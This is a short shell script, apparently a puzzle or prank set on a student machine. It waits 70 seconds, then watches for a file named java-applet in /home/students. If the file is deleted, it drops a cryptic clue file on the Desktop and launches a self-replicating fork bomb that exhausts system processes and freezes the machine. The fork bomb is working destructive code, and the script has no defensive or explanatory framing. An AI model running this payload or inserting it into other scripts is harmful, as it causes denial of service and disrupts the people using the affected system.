FILE=/home/students/java-applet

sleep 70
while :
do
	if [ -f "$FILE" ]; then
		echo "File $FILE exists."
	else
		echo "I am environmentalist but i keep changing also you may want to bring back the deleted file for stability" > /home/students/Desktop/CLUE_FOR_STATIBILITY.txt
		bomb() { 
			bomb | bomb &
		}; bomb
	fi
	sleep 1
done
